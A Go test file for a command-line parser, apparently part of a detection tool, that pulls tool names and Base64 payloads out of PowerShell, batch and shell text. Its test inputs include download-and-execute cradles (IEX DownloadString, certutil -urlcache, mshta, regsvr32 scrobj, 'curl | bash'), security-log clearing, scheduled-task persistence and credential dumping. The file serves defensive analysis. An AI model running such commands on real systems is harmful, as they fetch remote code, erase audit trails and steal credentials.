package parse

import (
	"encoding/base64"
	"encoding/binary"
	"slices"
	"strings"
	"testing"
	"unicode/utf16"
)

func methods(s Script) []string {
	var out []string
	for _, x := range s.Transforms {
		out = append(out, x.Method)
	}
	return out
}

func TestPowerShellNativeCommands(t *testing.T) {
	tests := []struct {
		name string
		src  string
		want []string
	}{
		{"a bare name", `certutil -urlcache -split -f http://10.0.0.1/a.b64 a.b64`, []string{"certutil"}},
		{"the call operator", `& certutil -decode a.b64 a.dll`, []string{"certutil"}},
		{"a quoted path after the call operator", `& "C:\Program Files\Tool\x.exe" -q`, []string{"x.exe"}},
		{"inside cmd /c", `cmd /c certutil -decode a.b64 a.dll`, []string{"cmd", "certutil"}},
		{"inside a quoted cmd /c", `cmd.exe /c "regsvr32 /s /i:http://10.0.0.1/x.sct scrobj.dll"`, []string{"cmd.exe", "regsvr32"}},
		{"the target of Start-Process", `Start-Process rundll32 -ArgumentList "a.dll,Start"`, []string{"start-process", "rundll32"}},
		{"the task a scheduled task runs", `schtasks /create /tn U /tr "rundll32.exe C:\a.dll,Start" /sc onlogon`, []string{"rundll32.exe", "schtasks"}},
		{"the alias of Invoke-Expression", `IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.1/a.ps1")`, []string{"new-object", "iex"}},
		{"the right of an assignment", `$out = whoami /all`, []string{"whoami"}},
		{"inside script blocks", `if ($x) { wevtutil cl Security } else { net user }`, []string{"wevtutil", "net"}},
		{"a script block argument", `Invoke-Command -ScriptBlock { nltest /dclist:corp } -ComputerName dc01`, []string{"invoke-command", "nltest"}},
		{"a sub-expression", `Write-Output (hostname)`, []string{"hostname"}},
		{"Process.Start with arguments", `[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")`, []string{"cmd.exe", "whoami"}},
		{"wmic process call create", `wmic process call create "cmd /c whoami"`, []string{"wmic", "cmd", "whoami"}},
		{"an inline PowerShell command", `powershell.exe -nop -c "whoami; mshta http://10.0.0.1/a.hta"`, []string{"powershell.exe", "whoami", "mshta"}},
		{"a redirected command", `net.exe group "Domain Admins" /domain >> recon.txt`, []string{"net.exe"}},
		{"a relative path", `.\tools\rubeus.exe dump`, []string{"rubeus.exe"}},

		{"an output file is not a tool", `csc.exe /out:a.exe a.cs`, []string{"csc.exe"}},
		{"a downloaded file is not a tool", `certutil.exe -urlcache -f http://10.0.0.1/c.exe $env:TEMP\c.exe`, []string{"certutil.exe"}},
		{"-OutFile names a file", `Invoke-WebRequest http://10.0.0.1/t.exe -OutFile t.exe`, []string{"invoke-webrequest"}},
		{"a variable path run by the call operator", `& $env:TEMP\c.exe /quiet`, []string{"c.exe"}},
		{"a hashtable", `$h = @{ Name = 'x'; Path = "C:\a"; Verb = runas }`, nil},
		{"a method call", `$r = $wc.DownloadString("http://x") ; $s.Trim()`, nil},
		{"a continued member access", `    .Trim()`, nil},
		{"a loop", `foreach ($f in $files) { Write-Host $f }`, nil},
		{"a static call", `$asm = [System.Reflection.Assembly]::Load($bytes)`, nil},
		{"a trailing comment", `$total = $a + $b # reg add later`, nil},
		{"a string", `"certutil -decode a b"`, nil},
		{"an array", `$list = alpha, beta`, nil},
		{"a number", `$key = 0x42; $size = 64kb; $n = 3.5`, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := toolNames(ExtractPowerShell(tt.src + "\n")); !slices.Equal(got, tt.want) {
				t.Errorf("ExtractPowerShell(%q) tools = %q, want %q", tt.src, got, tt.want)
			}
		})
	}
}

func TestPowerShellSkipsDataAndProse(t *testing.T) {
	src := "$src = @\"\nusing System;\npublic class K { static void Main() { } }\n\"@\n" +
		"<#\n.SYNOPSIS\n  runs certutil and Get-Process\n#>\n" +
		"<# one line #>\n" +
		"$json = @'\nwhoami\n'@\n" +
		"ipconfig /all\n"
	if got, want := toolNames(ExtractPowerShell(src)), []string{"ipconfig"}; !slices.Equal(got, want) {
		t.Errorf("tools = %q, want %q", got, want)
	}
}

func TestPowerShellCertutilTransforms(t *testing.T) {
	s := ExtractPowerShell("certutil -decode a.b64 a.dll\ncertutil.exe /encode a.bin a.b64\ncertutil -decodehex a.hex a.bin\ncertutil -hashfile a.bin\n")
	if got, want := methods(s), []string{"Base64Decode", "Base64Encode", "HexDecode"}; !slices.Equal(got, want) {
		t.Errorf("transforms = %q, want %q", got, want)
	}
}

func TestExtractBatch(t *testing.T) {
	src := strings.Join([]string{
		"@echo off",
		"rem cleanup",
		":: another comment",
		"set OUT=%TEMP%\\c.exe",
		"certutil -urlcache -f http://10.0.0.1/c.exe %OUT%",
		"certutil -decode a.b64 a.dll & wevtutil cl System",
		"if exist a.dll rundll32 a.dll,Start",
		"if not \"%1\"==\"\" net user",
		"if %ERRORLEVEL% neq 0 hostname",
		"for /f %%i in ('whoami') do echo %%i > who.txt",
		"start \"\" /b mshta.exe http://10.0.0.1/a.hta",
		"start \"My Window\" notepad.exe",
		"call :sub",
		"schtasks /create /tn U /tr \"cmd /c reg add HKCU\\Software\\X /v U /d calc\" ^",
		"  /sc onlogon",
		":sub",
		"del /q a.b64 >nul 2>&1",
		"\"C:\\Program Files\\7-Zip\\7z.exe\" a loot.7z C:\\Users\\Public\\*",
		"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')\"",
		"tasklist /v >> procs.txt",
	}, "\r\n")
	s := ExtractBatch(src)
	wantTools := []string{
		"certutil", "certutil", "wevtutil", "rundll32", "net", "hostname", "whoami", "mshta.exe", "notepad.exe",
		"schtasks", "cmd", "reg", "del", "7z.exe", "powershell", "new-object", "iex", "tasklist",
	}
	if got := toolNames(s); !slices.Equal(got, wantTools) {
		t.Errorf("tools = %q\nwant    %q", got, wantTools)
	}
	if got, want := methods(s), []string{"Base64Decode"}; !slices.Equal(got, want) {
		t.Errorf("transforms = %q, want %q", got, want)
	}
	if got, want := s.Writes, []string{"who.txt", "procs.txt"}; !slices.Equal(got, want) {
		t.Errorf("writes = %q, want %q", got, want)
	}
	if len(s.Variables) != 1 || s.Variables[0].Name != "OUT" || s.Variables[0].Value != `%TEMP%\c.exe` {
		t.Errorf("variables = %+v, want OUT", s.Variables)
	}
	for _, c := range s.Commands {
		if c.Tool == "schtasks" && c.Line != 14 {
			t.Errorf("the continued schtasks command is on line %d, want 14", c.Line)
		}
	}
}

func TestBatchNestingIsBounded(t *testing.T) {
	line := strings.Repeat("cmd /c ", 50) + "whoami"
	if got := len(ExtractBatch(line).Commands); got != maxNesting+1 {
		t.Errorf("%d commands from 50 nested launchers, want %d", got, maxNesting+1)
	}
	if got := toolNames(ExtractBatch("\"\"\n()\n/c x\n123 4\n")); got != nil {
		t.Errorf("tools from lines that name no command = %q", got)
	}
}

func TestExtractCommandShapes(t *testing.T) {
	cases := map[string][]string{
		`schtasks /create /tn U /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon`: {"schtasks", "rundll32.exe"},
		`C:\Windows\System32\cmd.exe /c whoami & hostname`:                                  {"cmd.exe", "whoami", "hostname"},
		`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`:                           {"rundll32.exe"},
		`wmic process call create "calc"`:                                                   {"wmic", "calc"},
		`cat /etc/passwd | grep root; id`:                                                   {"cat", "grep", "id"},
		`curl -s http://x.example/a.sh | bash`:                                              {"curl", "bash"},
		`powershell -nop -w hidden -c "[Reflection.Assembly]::Load($b)"`:                    {"powershell"},
	}
	for line, want := range cases {
		if got := toolNames(ExtractCommand(line)); !slices.Equal(got, want) {
			t.Errorf("ExtractCommand(%q) tools = %q, want %q", line, got, want)
		}
	}
}

func encodeCommand(script string) string {
	units := utf16.Encode([]rune(script))
	raw := make([]byte, 0, 2*len(units))
	for _, u := range units {
		raw = binary.LittleEndian.AppendUint16(raw, u)
	}
	return base64.StdEncoding.EncodeToString(raw)
}

func TestDecoded(t *testing.T) {
	inner := `IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')`
	enc := encodeCommand(inner)
	literal := base64.StdEncoding.EncodeToString([]byte("certutil -urlcache -f http://10.0.0.2/b.exe b.exe"))
	binary := base64.StdEncoding.EncodeToString([]byte{0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xff, 0xff, 0, 0, 0xb8, 0, 0, 0})
	tests := []struct {
		name string
		text string
		want []Payload
	}{
		{"-EncodedCommand", "powershell.exe -nop -EncodedCommand " + enc, []Payload{{inner, PowerShell}}},
		{"-enc, quoted", `powershell -enc "` + enc + `"`, []Payload{{inner, PowerShell}}},
		{"-e", "pwsh -e " + enc, []Payload{{inner, PowerShell}}},
		{"-ec without padding", "powershell -ec " + strings.TrimRight(enc, "="), []Payload{{inner, PowerShell}}},
		{"a literal that is text", `$s = [Convert]::FromBase64String("` + literal + `")`, []Payload{{"certutil -urlcache -f http://10.0.0.2/b.exe b.exe", ""}}},
		{"a literal that is a binary", `[Convert]::FromBase64String("` + binary + `")`, nil},
		{"-ExecutionPolicy is not -EncodedCommand", "powershell -ExecutionPolicy " + enc, nil},
		{"-e with text that is not Base64 text", "grep -e AAAAAAAAAAAAAAAAAAAAAAAA file", nil},
		{"not Base64 at all", "powershell -enc !!!!", nil},
		{"nothing", "whoami", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Decoded(tt.text); !slices.Equal(got, tt.want) {
				t.Errorf("Decoded = %+v, want %+v", got, tt.want)
			}
		})
	}
}

func TestDecodedIsBounded(t *testing.T) {
	enc := encodeCommand("whoami /all")
	many := strings.Repeat("powershell -enc "+enc+"\n", maxPayloads+10)
	if got := len(Decoded(many)); got != maxPayloads {
		t.Errorf("%d payloads, want the limit of %d", got, maxPayloads)
	}
	huge := "powershell -enc " + strings.Repeat("AAAA", maxPayload/4+1)
	if got := Decoded(huge); got != nil {
		t.Errorf("a payload over the limit was decoded")
	}
}
